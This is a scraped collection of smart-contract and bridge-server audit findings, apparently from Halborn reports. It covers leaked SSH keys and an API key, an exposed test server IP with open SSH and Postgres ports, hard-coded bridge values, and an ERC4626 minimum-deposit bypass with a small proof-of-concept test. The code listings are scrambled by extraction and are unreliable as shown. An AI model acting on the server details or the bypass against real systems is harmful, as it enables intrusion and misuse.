        "body": "During the test, it was determined that one of the import on the contract was not used. This situation does not pose any risk in terms of security. But it is important for the readability and applicability of the code Code Location: Listing 12: contracts/Riverboat (Lines 9) 1 pragma solidity ^0.6.7; 2 3 import \" ./../ openzeppelin / contracts / token / ERC20 / IERC20 . sol \" ; 4 import \" ./../ openzeppelin / contracts / token / ERC20 / SafeERC20 . sol \" ; 5 import \" ./../ openzeppelin / contracts / token / ERC721 / IERC721 . sol \"; 6 import \" ./../ openzeppelin / contracts / token / ERC721 / IERC721Receiver . sol \" ; 7 import \" ./../ openzeppelin / contracts / access / Ownable . sol \"; 8 import \" ./ LighthouseTierInterface . sol \"; 9 import \" ./ RiverboatNft . sol \"; Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the RiverboatNft.sol import from the contract if it will not be used for any purpose. 26 Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 27 ",
        "labels": [
            "Halborn",
            "Seascape_Riverboat_NFT",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRIVATE SSH KEYS COMMITTED TO GIT REPOSITORY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Private SSH keys are publicly exposed on GitHub. Code Location: Private SSH keys are accessible by browsing the public casper-eth-bridge repository. Figure 1: Private keys are accessible via GitHub Proof of concept:  A malicious party reads the private keys.  The private keys are used to authenticate to the test server.  With access to the test server, the attacker can access other sensitive information such as database passwords, API keys, and private source code. 27 BVSS: AO:A/AC:L/AX:M/C:C/I:C/A:C/D:C/Y:C/R:N/S:C (10) Recommendation: Remove the SSH keys from GitHub. Disable their access to all servers, including test servers. Ensure that private information is not committed to git repositories. Remediation Plan: SOLVED: The casper-eth-bridge repository is no longer public. 28 ",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: Critical"
        ]
    },
    {
        "title": "PANIC ON EVENT PARSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The code for parsing events into Go data structures can panic under certain circumstances. If the incoming event data is not in the expected format, a nil dereference error can occur, which causes a panic in Go code. If encountered in a production environment, services using this code will crash and require manual restart from an administrator. Code Location: The code below performs string slicing without doing bound checks. This is the source of the panic error. When an offset exceeds the length of the slice, the code will panic. tricorn/internal/eventparsing/eventparsing.go Listing 1: getNextParam() accesses an offset index without checking that it is within the range of e.Bytes e. offset += offset param := e . Bytes [e . offset : e. offset + limit ] e. offset += limit return param 65 // getNextParam returns next parameter for specified data length . 66 func ( e * EventData ) getNextParam ( offset int , limit int ) string { 67 68 69 70 71 } 72 73 // GetEventType returns event type from event data . 74 func ( e * EventData ) GetEventType () ( int , error ) { 75  LengthSelectorTag . Int () ) eventTypeHex := e. getNextParam ( LengthSelectorString . Int () , 29 76 77 78 79 80 81 82 83 84 85 } eventTypeBytes , err := hex . DecodeString ( eventTypeHex ) if err != nil { return 0, err } eventType := big . NewInt (0) . SetBytes ( eventTypeBytes ) return int ( eventType . Int64 () ) , nil Proof-of-concept:  An event is processed by the chain that is not in the expected format.  When attempting to parse the event, the code pictured above panics.  Bridge services calling this code will be unavailable until an administrator restarts the service This vulnerability was discovered using fuzz testing. Further details can be found in the Automated Testing section at the end of this report. BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:C/D:N/Y:N/R:N/S:C (8.4) Recommendation: Add bounds checks to the parsing code to ensure that panics do not occur. Remediation Plan: SOLVED: BoostyLabs solved the issue by adding the checks. Pull Request : 310 30 ",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: High"
        ]
    },
    {
        "title": "TOKENID IS HARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The value for TokenId in transfers is hard-coded. This means that it is only possible to transfer a single ERC-20 test token. As a result, the bridge is not fully functional, as there is no way to specify a different token based on user input. Code Location: bridge/service.go Listing 2: Example 1: hard-coded to the value 1 (Line 400) Building a Bridge In transfer: tokenId is 399 400 401 402 403 tokenTransfer := transfers . TokenTransfer { TokenID : Amount : Status : SenderNetworkID : 1, // todo : dynamically change . * amount , transfers . StatusWaiting , int64 ( networks . NetworkNameToID [  senderNetworkName ]) , 404 405 406 407 408 409 410 411 SenderAddress : RecipientNetworkID : int64 ( recipientNetworkID ) , RecipientAddress : recipientAddress , senderAddress , } err = service . tokenTransfers . Create ( ctx , tokenTransfer ) if err != nil { service . log . Error ( fmt . Sprintf (\" couldn 't create token  transfer for network name %s \" , request . Sender . NetworkName ) , Error .  Wrap ( err )) 412 413 414 415 return BridgeInSignatureResponse {} , Error . Wrap ( err ) } return bridgeInSignature , service . nonces . Increment ( ctx ,  senderID ) 31 bridge/service.go Listing 3: Example 2: Responding to a blockchain event log to do a Bridge Out action (Lines 580,609) 573 574 { // call BridgeOut . toAddress , err := networks . StringToBytes (  recipientNetworkID , eventFund . EventFundsIn . To . Address ) 575 576 577  Error () ) 578 579 580 if err != nil { service . log . Error (\" \" , Error . Wrap ( err )) return status . Error ( codes . Internal , Error . Wrap ( err ). } token , err := service . networkTokens . Get ( ctx ,  recipientNetworkID , 1) // TODO : add dynamic token id . 581 582 583  Error () ) 584 585 586 if err != nil { service . log . Error (\" \" , Error . Wrap ( err )) return status . Error ( codes . Internal , Error . Wrap ( err ). } bridgeOut , err := service . connectors [ networks . Name (  eventFund . EventFundsIn . To . NetworkName ) ]. BridgeOut ( ctx , chains .  TokenOutRequest { 587 588 589 590 591 592 593 594 595 596 597 598 Amount : amount , Token : To : From : networks . Address { token . ContractAddress , toAddress , NetworkName : networkName . String () , Address : hex . EncodeToString ( senderAddress ) , }, TransactionID : big . NewInt ( int64 ( transactionID )) , }) if err != nil { service . log . Error (\" \" , Error . Wrap ( err )) return status . Error ( codes . Internal , Error . Wrap ( err ).  Error () ) 599 600 601 } if len ( bridgeOut . Txhash ) == 0 { err = errs . New (\" couldn 't send bridgeOut in network %s \"  , eventFund . EventFundsIn . To . NetworkName ) 602 603  Error () ) service . log . Error (\" \" , Error . Wrap ( err )) return status . Error ( codes . Internal , Error . Wrap ( err ). 32 604 605 606 607 608 609 610 611 612 } } tokenTransfer := transfers . TokenTransfer { TokenID : Amount : SenderAddress : RecipientAddress : recipientAddress , 1, // todo : dynamically change . * amount , senderAddress , } Proof-of-concept:  A user wishes to make a transfer using the bridge.  When visiting the UI, the user can choose only a Test token.  As a result, the user cannot transfer their ERC-20 tokens. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:H/D:N/Y:N/R:N/S:U (7.5) Recommendation: Remove placeholder values and replace with dynamic values. Before pushing changes to the codebase, ensure that core operations are tested thoroughly with a range of values. Remediation Plan: SOLVED: BoostyLabs solved the issue by fixing the implementation. Pull Request : 336 33 ",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: High"
        ]
    },
    {
        "title": "USERS CANNOT WITHDRAW FUNDS DUE TO HARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Users cannot withdraw their liquidity from the bridge due to a hard-coded value for commission. The expected behavior is that a user can deposit tokens to the bridge, and later request a Cancel Signature in order to withdraw the tokens they have deposited. This in turn triggers a Transfer Out action that corresponds to a Solidity function that allows a user to withdraw funds. This two-step process involves a deposit and a withdraw action, each referred to as Bridge In and Cancel Signature within the Go code. For both steps, a commission that represents a gas cost of the transaction is calculated and sent as a value in a Bridge In transaction to Solidity. The Solidity code stores this amount separately from the contacts main token balance in a map that matches the senders address to the commission amount. Code Location: The commission field for TransferOut is calculated in the EstimateTransfer function in turns uses a go-ethereum method, SuggestGasPrice. chains/evm/service.go Listing 4: (Lines 182,192,195) 181 // EstimateTransfer estimates transfer fee and time . 182 func ( service * Service ) EstimateTransfer ( ctx context . Context ) (  chains . Estimation , error ) { 183 184 185 186 gasPrice , err := service . ethClient . SuggestGasPrice ( ctx ) if err != nil { return chains . Estimation {} , Error . Wrap ( err ) } 34 187 188 189 190 191 192 // TODO : change in dynamic way , as in BridgeOut method . gasLimit := new ( big . Int ). SetUint64 ( service . config . GasLimit ) feeWei := gasPrice . Mul ( gasPrice , gasLimit ) fee := new ( big . Float ). Quo ( new ( big . Float ). SetInt ( feeWei ) , new (  big . Float ). SetUint64 ( wei )) 193 194 195 196 197 198 199 200 201 } estimation := chains . Estimation { Fee : FeePercentage : EstimatedConfirmation : service . config . ConfirmationTime , fee . String () , service . config . FeePercentage , } return estimation , nil Ordinarily, the commission is calculated using the above function. However, it is commented-out in the codebase: tricorn/bridge/service.go Listing 5: Building a BridgeIn transaction: gasCommission is hard-coded to the value 1 and calculations are commented-out. (Lines 363,364,379) 363 364 // TODO : uncomment after fix . // destinationEstimation , err := service . connectors [  recipientNetworkName ]. EstimateTransfer ( ctx , transfers .  EstimateTransfer { 365 366 367 368 369 370 371 372 373 374 request . Sender . NetworkName , request . TokenID , request . Amount , SenderNetwork : RecipientNetwork : request . Destination . NetworkName , TokenID : Amount : // // // // // }) // if err != nil { // // } // // gasCommission , ok := new ( big . Int ) . SetString ( return BridgeInSignatureResponse {} , Error . Wrap ( err )  destinationEstimation . Fee , 10) 375 376 // if ! ok { // return BridgeInSignatureResponse {} , Error . New (\" couldn 't  parse gas commission \") 35 377 378 379 // }. gasCommission := new ( big . Int ). SetInt64 (1) The same commission value is not commented-out for the CancelSignature function (which is the corresponding withdraw action after the deposit action performed by BridgeIn). tricorn/bridge/service.go Listing 6: Building a CancelSignature transaction: the commission is calculated via EstimateTransfer 455 estimation , err := service . connectors [ networkName ].  EstimateTransfer ( ctx , transfers . EstimateTransfer { 456 457 458 459 460 461 462  ) 463 464 465 SenderNetwork : networkName . String () , RecipientNetwork : networkName . String () , TokenID : Amount : uint32 ( tokenTransfer . TokenID ) , tokenTransfer . Amount . String () , }) if err != nil { return transfers . CancelSignatureResponse {} , Error . Wrap ( err } commission , ok := new ( big . Int ). SetString ( estimation . Fee , 10) The commission calculated above is eventually encoded in a Transfer Out transaction that corresponds to the Solidity function transferOut. The BridgeIn commission will be equal to 1 because it is hard-coded. As a result, the TransferOut commission will always be much higher than the BridgeIn Commission by several orders of magnitude. When the _commissionPools value reaches 0, the operation will fail. This will happen as soon as a user tries to transferOut given the difference in size between the commission values. Ultimately, this will cause the transferOut operation to revert to Solidity when the commission is subtracted from the pool 36 ethereum/contracts/Bridge.sol repository. from the tricorn-smart-contracts git Listing 7: commission is subtracted from _commissionPools revert ( Errors . ALREADY_USED_SIGNATURE ); function transferOut ( address token , address recipient , uint256 amount , uint256 commission , uint256 nonce , bytes calldata signature ) external whenNotPaused { if ( _usedNonces [ nonce ]) { _checkTransferOutRequest ( address ( this ) , token , recipient , amount , commission , nonce , signature } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  totalSumForTransfer ); 34 ); } _usedNonces [ nonce ] = true ; _commissionPools [ token ] -= commission ; uint256 totalSumForTransfer = amount + commission ; IERC20 ( token ). safeTransfer ( recipient , totalSumForTransfer ); // TODO : Descrease pool commission emit TransferOut ( recipient , nonce , token , 37 Proof-of-concept:  A user deposits tokens into the bridge via Bridge In. The commission value is 1.  Later, the user wishes to withdraw their tokens via Cancel Signature which creates a Transfer Out action with a much higher commission.  When the Solidity code executes, a revert will occur when the _commissionPool value underflows as the high commission value is subtracted from 1.  As a result, the users funds are locked in the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:C/Y:N/R:P/S:C (7.0) Recommendation: Remove the TODO message and fix the code used to calculate the commission for the BridgeIn transaction type. Remediation Plan: SOLVED: The commented code has been removed and new logic for calculating commissions is added in PR 300. 38 ",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: High"
        ]
    },
    {
        "title": "DEPOSITS CAN BE LOCKED DUE TO WITHDRAWALS BY CONTRACT OWNER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: Medium"
        ]
    },
    {
        "title": "BRIDGE SUPPORTS UNENCRYPTED TRAFFIC",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "network microservices bridge The connections. gRPCs servers are initialized using an optional set of server options. If the Creds option is not specified, the connections will not be encrypted. unencrypted traffic allow over Code Location: An example where the code creates a gRPC server is outlined in the following code excerpt: internal/server/grpc/server.go Listing 8: gRPC server created with NewServer without a Creds option ) grpcServer := grpc . NewServer ( grpc . MaxRecvMsgSize ( defaultGrpcMessageSize ) , grpc . MaxSendMsgSize ( defaultGrpcMessageSize ) , 39 40 // NewServer is a constructor for GRPC server . 41 func NewServer ( logger logger . Logger , registerServer func (* grpc .  Server ) , name , address string ) * grpcserver { 42 43 44 45 46 47 48 49 50 51 52 53 54 55 } log : address : address , name : server : name , grpcServer , registerServer ( grpcServer ) return & grpcserver { logger , } 41 BVSS: AO:A/AC:L/AX:L/C:M/I:N/A:N/D:N/Y:N/R:N/S:C (6.2) Recommendation: Enable encryption for network connections in the bridge project. Remediation Plan: SOLVED: BoostyLabs added code to encrypt traffic in PR 296. 42 ",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: Medium"
        ]
    },
    {
        "title": "ADMINISTRATOR LOGIN PROTOCOLS ARE ACCESSIBLE FOR TEST SERVER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The documentation for the public casper-eth-bridge repository lists an IP address. Halborn examined this web server and discovered several configuration issues, including:  Database authentication exposed to the Internet.  TLS connection not enabled for sensitive data.  Sensitive ports exposed to the Internet. Code Location: README.md Listing 9: Excerpt from README file including the IP address 1 [ Logs ]( http ://142.93.173.38:9999/) This port hosted a login form for a Dozzle logging server that was available without encryption (as seen in the above excerpt, the logs are served using the plaintext http:// protocol). The [Dozzle documentation]((https://github.com/amir20/dozzle#authentication) recommends using TLS, as otherwise passwords will be revealed. A nmap scan was performed against the server in order to look for other exposed ports: 43 Figure 2: Exposed ports An exposed port 22 indicates that an SSH login is possible via the Internet. If an attacker brute-forces the password, they can obtain access to a user account on the server. Postgres is accessible to the internet on port 6433. A login was attempted as a proof-of-concept. Figure 3: Login is possible to postgres via the Internet. The first line shows a login attempt on a random, closed port. The second indicates that a Postgres service is listening The remaining exposed ports overlap with many of the ones that are opened in Tricorns deploy/docker-compose.yml file, namely: Listing 10: Ports opened in the Docker file 1 3000 2 6432 3 6433 4 6666 5 7777 6 8088 7 8888 8 9999 44 Taken together, this indicates that the bridge microservices were likely running on this server. This means that it would have been possible for an attacker to brute-force the user account and database passwords for the test server. Proof of Concept:  An attacker runs a tool to brute-force the SSH or Postgres password for the test server.  If successful, they could access the source code of the application and/or the contents of the database.  If password reuse occurs, the attacker may be able to compromise other infrastructure operated by Boosty. BVSS: AO:A/AC:L/AX:H/C:M/I:M/A:M/D:N/Y:N/R:N/S:C (3.1) Recommendation: Do not expose authentication to the public Internet. Instead, ensure that only privileged connections are allowed via a VPN. Ensure that public key authentication is used for SSH rather than passwords. Use TLS to secure authentication rather than plaintext HTTP connections. Avoid reusing credentials in testing and production environments. If there has been any credential reuse, then all credentials should be changed immediately to be strong, unique passphrases. As the server has been exposed to the Internet, consider investigating the server forensically in case a breach has already occurred. Remediation Plan: SOLVED: BoostyLabs was notified of this finding immediately during the initial stages of the assessment. The public repository listing the IP address is no longer accessible. The IP address is no longer accessible. 45 ",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: Low"
        ]
    },
    {
        "title": "UI ELEMENT FOR TRANSACTION FEE IS HARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The web application UI is hard-coded to display a fee percentage of 5%. Users will not be informed of the actual percentage as configured in the bridge or the contract. Code Location: web/bridge/src/apps/views/Swaps/index.tsx {language=javascript caption=\"The fee is displayed using fixed 46 text. There is no retrieval of a dynamic value.} <span className=\" swap__comission__label\">Current fee is 5%</span> During testing, the web application displayed a fee of 5% even though both the Go bridge and smart contract was configured with a value of 4%. Proof of concept:  At some point, the bridge fee is set to 6%.  A user makes a bridge transaction using the web app and sees 5% quoted as the fee percentage.  After transferring their funds, the user has paid more than they expected. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:L/Y:N/R:N/S:C (3.1) Recommendation: Populate this UI element dynamically according to the percentage value configured in the relevant smart contract(s). Remediation Plan: SOLVED: BoostyLabs solved the issue by changing the UI. 47 ",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: Low"
        ]
    },
    {
        "title": "PRIVATE ETHERSCAN API KEY EXPOSED IN GIT REPOSITORY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "An Etherscan API key is publicly exposed on GitHub. Code Location: The API key was discovered in the casper-eth-bridge repository in the file boosty-smart-contracts/ethereum/.env.example. Simple testing was performed to check that the key was active: 48 Proof of concept:  A malicious party discovers the API key in the repository.  They use the API key to make exhaust the number of tokens that Boosty purchased.  Any services relying on Etherscan will no longer be accessible. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:P/S:U (2.5) Recommendation: Remove the API key from the repository. Deactivate it within the Etherscan website and generate a new key for operations. Ensure that no private information is committed to GitHub repositories. Remediation Plan: SOLVED: The casper-eth-bridge repository is no longer public. 49 4.10 (HAL-10) LACK OF RATE LIMITING ON THE API - LOW (3.1) ",
        "labels": [
            "Halborn",
            "BoostyLabs_Tricorn_Bridge_Server_Golang",
            "Severity: Informational"
        ]
    },
    {
        "title": "MINIMUM DEPOSIT RESTRICTION CAN BE BYPASSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "LiquidUnstakePool and Staking smart contracts allow to deposit/withdraw tokens by using ERC4626 custom vaults. In this implementation, a modifier is involved in deposits since it guarantees a minimum amount of tokens in each deposit. This modifier should be applied to each function related to deposit. However, there is existing a public function named mint which allows specifying an amount of shares to mint instead of an amount of tokens to deposit as deposit functions do. This function is not restricted by the aforementioned modifier and allows to mint arbitrary amount of shares without restrictions, thus breaking the invariant set by validDeposit modifier. Code Location: Listing 1: contracts/LiquidUnstakePool.sol 58 modifier validDeposit ( uint _amount ) { 59 60 61 } require ( _amount >= MIN_DEPOSIT , \" Deposit at least 0.01 ETH \" ); _; Listing 2: contracts/LiquidUnstakePool.sol (Line 134) 129 function _deposit ( 130 131 132 133 134 ) internal virtual override nonReentrant { 135 address _caller , address _receiver , uint _assets , uint _shares _assets = _getAssetsDeposit ( _assets ); 19 136 137 138 139 } _mint ( _receiver , _shares ); ethBalance += _assets ; emit AddLiquidity ( _caller , _receiver , _assets , _shares ); Listing 3: contracts/Staking.sol 61 modifier validDeposit ( uint _amount ) { 62 63 64 } require ( _amount >= MIN_DEPOSIT , \" Deposit at least 0.01 ETH \" ); _; Listing 4: contracts/Staking.sol (Line 270) address _caller , address _receiver , uint256 _assets , uint256 _shares 265 function _deposit ( 266 267 268 269 270 ) internal override checkWhitelisting () { _assets = _getAssetsDeposit ( _assets ); 271 ( uint sharesFromPool , uint assetsToPool ) = _getmpETHFromPool ( 272  _shares , _receiver ); 273 274 275 276 277 278 279 _shares -= sharesFromPool ; _assets -= assetsToPool ; if ( _shares > 0) _mint ( _receiver , _shares ); stakingBalance += _assets ; emit Deposit ( _caller , _receiver , _assets + assetsToPool ,  _shares + sharesFromPool ); 280 } BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:L/Y:N/R:N/S:U (5.6) 20 Proof of Concept: In order to prove this issue, since the mint function is available, an account just has to perform a call with an amount lower than 0.1 ether as these values are supposed to be restricted. Listing 5: Minimum deposit restriction bypass } console . log (\" \" ); console . log (\" [1] LiquidUnstakePool balance ( ETH ): \" , address ( prepareBalances () ; console . log (\" [1] Attacker balance ( shares ) :\" , vm . startPrank ( ALICE ); { weth . approve ( address ( liquidunstakepool ) , 1) ; liquidunstakepool . mint (1 , ALICE ); 1 function testMintWithoutRestrictions () public { 2 3 4  liquidunstakepool ). balance ); 5  IERC20MetadataUpgradeable ( liquidunstakepool ). balanceOf ( ALICE )) ; 6 7 8 9 10 11 12 13 14  liquidunstakepool ). balance ); 15  IERC20MetadataUpgradeable ( liquidunstakepool ). balanceOf ( ALICE )) ; 16 } 17 18 function prepareBalances () public { vm . deal ( ALICE , 200 ether ); 19 vm . deal ( BOB , 200 ether ); 20 21 vm . deal ( CHARLIE , 200 ether ); 22 23 24 25 26 } weth . mint ( ALICE , 200 ether ); weth . mint ( BOB , 200 ether ); weth . mint ( CHARLIE , 200 ether ); console . log (\" [2] Attacker balance ( shares ) :\" , console . log (\" [2] LiquidUnstakePool balance ( ETH ): \" , address ( 21 Files required to execute properly this test such as DeploymentHelper.sol have been included in the Appendix of this document. Recommendation: It is recommended to set the validDeposit modifier in the mint function or include it in the _deposit internal function. Remediation Plan: SOLVED: The MetaPool team solved the issue by checking this invariant in the _deposit private function in the following commit ID:  79f910ea4f79ba108d21c2c67eb9b59478c2e7c0. 22 ",
        "labels": [
            "Halborn",
            "MetaPool_ETH_Staking",
            "Severity: Medium"
        ]
    },
    {
        "title": "ERC4626 VAULT DEPOSITS AND WITHDRAWS SHOULD CONSIDER SLIPPAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The scoped repositories make use of ERC4626 custom implementations that should follow the EIP-4626 definitions. This standard states the follow- ing security consideration: \"If implementors intend to support EOA account access directly, they should consider adding another function call for deposit/mint/withdraw /redeem with the means to accommodate slippage loss or unexpected deposit/withdrawal limits, since they have no other means to revert the transaction if the exact output amount is not achieved.\" These vault implementations do not implement a way to limit the slippage when deposits/withdraws are performed. This condition affects specially to EOA since they dont have a way to verify the amount of tokens received and revert the transaction in case they are too few compared to what was expected to be received. Applying this security consideration would help to EOA to avoid being front-run and losing tokens in transactions towards these smart contracts. Code Location: Listing 6: contracts/LiquidUnstakePool.sol 108 function deposit ( uint _assets , 109 address _receiver 110 111 ) public override validDeposit ( _assets ) returns ( uint ) 23 Listing 7: contracts/LiquidUnstakePool.sol 119 function depositETH ( 120 121 ) external payable validDeposit ( msg . value ) returns ( uint ) address _receiver Listing 8: contracts/LiquidUnstakePool.sol 168 function redeem ( 169 170 171 172 ) public virtual override nonReentrant returns ( uint ETHToSend ) uint _shares , address _receiver , address _owner Listing 9: contracts/Staking.sol 239 function deposit ( uint256 _assets , address _receiver ) 240 241 242 243 public override validDeposit ( _assets ) returns ( uint256 ) Listing 10: contracts/Staking.sol 252 function depositETH ( address _receiver ) 253 public 254 payable 255 validDeposit ( msg . value ) 256 returns ( uint256 ) BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:N/D:M/Y:N/R:N/S:U (3.4) Recommendation: It is recommended to include slippage checks in the aforementioned func- tions to allow EOA to set the minimum amount of tokens that they expect to receive by executing these functions. 24 References:  EIP-4626: Security Considerations Remediation Plan: SOLVED: The MetaPool team solved the issue by deploying new routers in order to handle EOA transactions and their respective slippage in the following commit IDs:  6b4e6770d840a8b90d3bda6ef31fb5de2665d753. 25 ",
        "labels": [
            "Halborn",
            "MetaPool_ETH_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "VAULTS ARE NOT EIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Following EIP-4626 definition, used ERC4626 custom implementations in scoped contracts are not fully EIP-4626 compliant due to the following functions are not meeting some EIPs requirements:  Withdraw function missing (LiquidUnstakePool).  maxDeposit function:  MUST return the maximum amount of assets deposit would allow to be deposited for receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.  maxMint function:  MUST return the maximum amount of shares mint would allow to be deposited to the receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.  Deposit function (LiquidUnstakePool):  MUST emit the Deposit event.  Redeem function (LiquidUnstakePool):  MUST emit the Withdraw event. 26 Code Location: Listing 11: contracts/LiquidUnstakePool.sol 158 function withdraw ( uint256 , 159 address , 160 address 161 162 ) public pure override returns ( uint ) { 163 164 } revert ( \" Use redeem \" ); Listing 12: contracts/LiquidUnstakePool.sol 138 emit AddLiquidity ( _caller , _receiver , _assets , _shares ); Listing 13: contracts/LiquidUnstakePool.sol 184 emit RemoveLiquidity ( msg . sender , _shares , ETHToSend , mpETHToSend ); BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:P/S:U (2.5) Recommendation: All aforementioned functions should be modified to meet the EIP-4626 specifications in order to avoid future compatibility issues. References:  EIP-4626: Specification Remediation Plan: SOLVED: The MetaPool team solved the issue in metapool-ethereum by stick- ing to EIP-4626 definitions in the following commit ID: 27  d6f739a7064ccfe965adb21ea498bcc1d5bb28ef. 28 ",
        "labels": [
            "Halborn",
            "MetaPool_ETH_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "USE CUSTOM ERRORS INSTEAD OF REVERT STRINGS TO SAVE GAS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Failed operations in several contracts are reverted with an accompanying message selected from a set of hard-coded strings. In the EVM, emitting a hard-coded string in an error message costs ~50 more gas than emitting a custom error. Additionally, hard-coded strings increase the gas required to deploy the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Custom errors are available from Solidity version 0.8.4 up. Consider replacing all revert strings with custom errors. Usage of custom errors should look like this: Listing 14 1 error CustomError () ; 2 3 // ... 4 5 if ( condition ) 6 revert CustomError () ; 29 Remediation Plan: SOLVED: The MetaPool team solved the issue by following the aforementioned recommendation. 30 ",
        "labels": [
            "Halborn",
            "MetaPool_ETH_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE UINT256 INSTEAD OF UINT IN FUNCTION ARGUMENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In solidity, its well known that uint type is an alias of uint256 type which means that, at compilation time, declared uint variables are treated as uint256 variables, as well as function arguments. This condition is essential during ABI definition, since every argument whose type is uint will be assigned to uint256 type. Then, calling to this kind of function through its ABI definition should not be an issue, since uint will always be processed as uint256 in external contracts. However, using raw calls to contracts functions whose arguments contain an uint type could lead to errors and unexpected reverts if uint types are specified in the function signature of these raw calls due to function signatures using uint will mismatch with the actual signature that is using a uint256 type defined in the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to change every uint type to uint256 in function arguments. Remediation Plan: SOLVED: The MetaPool team solved the issue in the following commit ID:  c86bac226b5cf581724b368385999cddda4e0bda. 31 ",
        "labels": [
            "Halborn",
            "MetaPool_ETH_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "LOOP GAS USAGE OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
